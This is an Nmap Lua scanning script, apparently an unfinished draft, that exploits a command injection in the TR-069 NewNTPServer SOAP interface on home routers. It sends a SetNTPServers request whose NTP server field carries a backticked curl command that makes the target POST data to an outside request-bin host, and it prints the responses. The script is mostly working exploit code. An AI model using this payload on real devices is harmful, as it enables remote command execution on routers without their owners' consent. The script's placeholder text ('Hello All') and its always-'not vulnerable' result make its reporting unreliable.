description = [[
TR-069 (Technical Report 069) is a technical specification that defines an application layer protocol for remote management of end-user devices.
TR-069 messages are encoded using SOAP. "NewNTPServer" feature in this can be used to execute arbitrary commands.



]]

local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local string = require "string"
local slaxml = require "slaxml"

---
-- @usage
-- nmap -p <port> --script  <target>
--
-- @output
--
--
-- @args ().path The URL path to request. The default path is "/".

author = "Vinamra Bhatia"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln", "exploit" }

portrule = shortport.port_or_service({7547,5037})

action = function(host, port)
    local vuln = {
        title = "TR-069 NewNTPServer Exploit",
        state = vulns.STATE.NOT_VULN,
        description = [[
            Hello All
        ]],
        references = {
            'https://isc.sans.org/forums/diary/TR069+NewNTPServer+Exploits+What+we+know+so+far/21763/'
        }
    }

    local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

    local path = stdnse.get_script_args(SCRIPT_NAME..".path") or "/"
    local value = stdnse.generate_random_string(16)
    print(value)

    local header = {
        ["Content-Type"] = "text/xml",
        ["SOAPAction"] = "urn:dslforum-org:service:Time:1#SetNTPServers"
        --["Content-Length"] = "539"
    }


    local content = "<?xml version=\"1.0\"?>" .. 
    "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " ..
    "SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">" ..
    " <SOAP-ENV:Body>" ..
    "  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">"..
    "   <NewNTPServer1>`curl -X POST -d \"fizz=buzz\" https://requestb.in/177qut41`</NewNTPServer1>" .. 
    "   <NewNTPServer2></NewNTPServer2>" ..
    "   <NewNTPServer3></NewNTPServer3>" ..
    "   <NewNTPServer4></NewNTPServer4>" ..
    "  </u:SetNTPServers>" ..
    " </SOAP-ENV:Body>" ..
    "</SOAP-ENV:Envelope>"

    local parser = slaxml.parser:new()
    parser:parseSAX(content)

    print(content)

    local response

    response = http.post(host, port, "/UD/act?1", {header = header}, nil, content)

    for k,v in pairs(response) do
        print(k,v)
        
        if type(v) == "table" then
            for kk,vv in pairs(v) do
                print(kk,vv)
            end
        end
        
    end

    return vuln_report:make_output(vuln)
end
